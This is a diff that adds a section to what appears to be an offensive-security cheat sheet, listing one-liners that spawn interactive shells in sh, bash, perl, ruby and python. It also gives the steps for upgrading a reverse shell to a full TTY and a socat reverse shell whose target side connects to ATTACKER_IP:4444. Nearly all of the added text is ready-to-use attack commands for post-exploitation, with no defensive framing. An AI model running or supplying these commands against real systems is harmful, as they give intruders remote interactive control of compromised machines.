@@ -1386,6 +1386,44 @@ https://reverse-shell.sh/
 https://github.com/calebstewart/pwncat
 <br># pwncat is a post-exploitation platform for Linux targets.
 
+<br># Interactive sh shell
+<br>```/bin/sh -i```
+
+<br># Interactive bash shell
+<br>```/bin/bash -i```
+
+<br># Interactive shell perl
+<br>```perl -e 'exec "/bin/sh";'```
+# or
+<br>```perl -e 'use POSIX; POSIX::setsid(); exec("/bin/bash -i");'```
+
+<br># Interactive shell ruby
+<br>```ruby -e 'exec "/bin/bash"'```
+
+https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1
+<br># How to Get a Fully Interactive Reverse Shell
+<br># Step 1
+<br>```python -c "import pty; pty.spawn('/bin/bash')"```
+<br># or
+<br>```python3 -c "import pty; pty.spawn('/bin/bash')"```
+<br># or
+<br>```script /dev/null -c bash```
+<br># Step 2
+<br>```CTRL + z```
+<br># Step 3
+<br>```stty raw -echo```
+<br>```fg```
+<br># or
+<br>```stty raw -echo;fg```
+<br># Step 4
+<br>```export TERM=xterm```
+
+<br># Reverse shell /dev/pts method
+# On attacker
+<br>```socat file:`tty`,raw,echo=0 tcp-listen:4444```
+# On target
+<br>```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444```
+
 ### SQLi (SQL Injection)<a name="sqli-sql-injection_manual"></a>
 https://arxiv.org/abs/1303.3047
 <br># This paper describes an advanced SQL injection technique where DNS resolution process is exploited for retrieval of malicious SQL query results.
